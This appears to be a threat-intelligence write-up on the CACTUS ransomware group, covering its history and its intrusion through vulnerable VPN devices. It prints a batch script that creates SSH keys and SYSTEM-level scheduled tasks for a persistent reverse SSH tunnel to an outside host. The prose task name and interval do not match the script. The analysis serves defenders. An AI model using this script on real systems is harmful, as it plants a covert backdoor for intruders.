## History 

The CACTUS ransomware is said to have emerged around March 2023. The group became known for exploiting vulnerabilities to gain initial access and maintain a presence within the organization's infrastructure.

There is little known information about the ransomware group, except that it emerged on the mentioned date and, following encryption, a text file named 'cAcTuS.readme.txt' would be created. Additionally, encrypted files were altered to the '.cts1' extension, and data exfiltration and victim extortion were conducted through the use of the service known as Tox.

As mentioned earlier, the ransomware especially exploits vulnerabilities in VPNs, also utilizing obfuscation techniques to conceal its activities, such as employing UPX and utilizing encryption algorithms like OpenSSL, AES OCB, ChaCha20_Poly1305, system reinitializations, and others.

## Ransomware Cactus Attack Chain

**INITIAL ACCESS**
For Initial Access, the ransomware group exploits known vulnerabilities in VPN devices, followed by the creation of an SSH backdoor that facilitates access for the actor and manages to persist within the organization's infrastructure.

In these invasions through vulnerable VPN devices, the actors exploited the use of VPN service accounts and then used the following command to set up an SSH server to maintain persistent access, using scheduled tasks. The scheduled task is named 'Updates Check Task' and runs every 5 minutes, executed as SYSTEM.

|echo off %programdata%\sshd\ssh-keygen -f %programdata%\sshd\config\id_rsa -t rsa -N "" icacls %programdata%\sshd\config\keys\id_rsa /inheritance:r icacls %programdata%\sshd\config\keys\id_rsa /grant:r "%username%":"(R)" icacls %programdata%\sshd\config\id_rsa /inheritance:r icacls %programdata%\sshd\config\id_rsa /grant:r "%username%":"(R)" schtasks.exe /create /sc minute /mo 1 /tn "SSH Server" /rl highest /np /tr "%programdata%\sshd\sshd.exe -f %programdata%\sshd\config\sshd_config" schtasks.exe /create /sc minute /mo 1 /tn "SSH Key Exchange" /rl highest /np /tr "%programdata%\sshd\ssh.exe -i %programdata%\sshd\config\keys\id_rsa -N -R 22682:127.0.0.1:2222 -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -o ServerAliveCountMax=15 root@| 


